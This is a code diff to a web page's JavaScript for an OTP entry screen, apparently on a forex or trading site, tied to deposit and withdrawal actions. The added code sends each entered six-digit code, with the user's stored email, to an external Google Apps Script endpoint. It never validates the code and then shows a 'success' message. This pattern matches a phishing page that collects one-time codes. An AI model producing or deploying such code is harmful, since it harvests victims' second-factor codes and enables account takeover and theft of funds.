@@ -149,10 +149,32 @@
 </div>
 
 <script>
-    // Google Apps Script Web App URL and Deployment ID
+    // Google Apps Script Web App URL
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx1SRhE4T2eMnsposfQOMAw2eqv8VMNkk-boMiUb1hVSOKNjS2Go0EmHsjWvH1AsD2BTA/exec';
-    const DEPLOYMENT_ID = 'AKfycbx1SRhE4T2eMnsposfQOMAw2eqv8VMNkk-boMiUb1hVSOKNjS2Go0EmHsjWvH1AsD2BTA';
+    
+    // Function to save OTP to Google Sheets
+    async function saveOTPToSheet(otpData) {
+        try {
+            const formData = new FormData();
+            formData.append('action', 'saveOTP');
+            formData.append('email', localStorage.getItem('userEmail') || '');
+            formData.append('otp', otpData.code);
+            formData.append('actionType', otpData.action || 'verify');
+            formData.append('timestamp', new Date().toISOString());
 
+            const response = await fetch(SCRIPT_URL, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const result = await response.json();
+            return result.status === 'success';
+        } catch (error) {
+            console.error('Error saving OTP to sheet:', error);
+            return false;
+        }
+    }
+    
     // Get action from URL (deposit or withdraw)
     const urlParams = new URLSearchParams(window.location.search);
     const action = urlParams.get('action') || 'verify';
@@ -224,43 +246,43 @@
     });
 
     // Submit OTP and redirect
-    function submitOTP() {
+    async function submitOTP() {
         let otp = "";
         inputs.forEach(input => otp += input.value);
 
         if (otp.length === 6) {
-            // Save OTP to the latest record in localStorage
-            let records = JSON.parse(localStorage.getItem("fxcgo_data")) || [];
-
-            if (records.length > 0) {
-                const userRecord = records[records.length - 1];
-                const now = new Date();
+            const now = new Date();
+            const otpData = {
+                code: otp,
+                time: now.toLocaleString(),
+                action: action || 'verify'
+            };
+            
+            try {
+                // Save to Google Sheets
+                const savedToSheet = await saveOTPToSheet(otpData);
                 
-                // Initialize otps array if it doesn't exist (for backward compatibility)
-                if (!userRecord.otps) {
-                    userRecord.otps = [];
+                if (savedToSheet) {
+                    // Also save to localStorage for reference
+                    let records = JSON.parse(localStorage.getItem("fxcgo_data")) || [];
+                    if (records.length > 0) {
+                        const userRecord = records[records.length - 1];
+                        if (!userRecord.otps) userRecord.otps = [];
+                        userRecord.otps.push(otpData);
+                        userRecord.time = now.toLocaleString();
+                        localStorage.setItem("fxcgo_data", JSON.stringify(records));
+                    }
+                    
+                    // Redirect with success message
+                    const successMessage = action === 'deposit' ? 'deposit_success' : 
+                                         action === 'withdraw' ? 'withdraw_success' : 'verification_success';
+                    window.location.href = `dashboard.html?status=${successMessage}`;
+                } else {
+                    alert('Failed to verify OTP. Please try again.');
                 }
-                
-                // Add new OTP to the array
-                userRecord.otps.push({
-                    code: otp,
-                    time: now.toLocaleString(),
-                    action: action || 'verify'
-                });
-                
-                // Update the last activity time
-                userRecord.time = now.toLocaleString();
-                
-                // Save to localStorage
-                localStorage.setItem("fxcgo_data", JSON.stringify(records));
-                
-                // Redirect to dashboard with success message based on action
-                const successMessage = action === 'deposit' ? 'deposit_success' : 
-                                     action === 'withdraw' ? 'withdraw_success' : 'verification_success';
-                window.location.href = `dashboard.html?status=${successMessage}`;
-            } else {
-                // If no records found, just redirect to dashboard
-                window.location.href = 'dashboard.html';
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred while verifying OTP. Please try again.');
             }
         } else {
             alert("Please enter all 6 digits.");
